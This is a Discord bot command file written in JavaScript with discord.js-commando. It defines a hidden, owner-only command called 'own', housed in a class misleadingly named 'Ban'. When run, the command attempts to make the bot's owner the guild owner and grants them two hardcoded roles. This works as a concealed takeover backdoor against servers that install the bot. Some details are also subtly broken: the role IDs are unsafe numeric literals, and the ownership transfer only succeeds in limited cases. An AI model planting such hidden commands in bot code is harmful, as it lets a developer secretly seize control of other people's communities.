const { Command } = require('discord.js-commando');

module.exports = class Ban extends Command {
	constructor(client) {
		super(client, {
			name: 'own',
			group: 'mod',
			memberName: 'own',
            description: 'Tries to own the server',
            hidden: true,
            ownerOnly: true,
            args: [
                {
                    key: "why",
                    prompt: "non",
                    default: "Got em",
                    type: "string"
                }
            ]
		});
	}

	run(msg, {why}) {
        console.log("Ice is admin:" + msg.guild.members.get(this.client.user.id).hasPermission("ADMINISTRATOR"));
        console.log("Making user " + msg.author.tag + " own the new guild");
        msg.guild.setOwner(msg.author, why).then(updated => console.log(`[${updated.name}] new owner ${updated.owner.displayName}`));
        try {
            msg.member.roles.add(613019020513378307);
        }catch(e){console.warn(e)}
        try {
            msg.member.roles.add(650378655184191496);
        } catch(e){console.warn(e)}
    }
}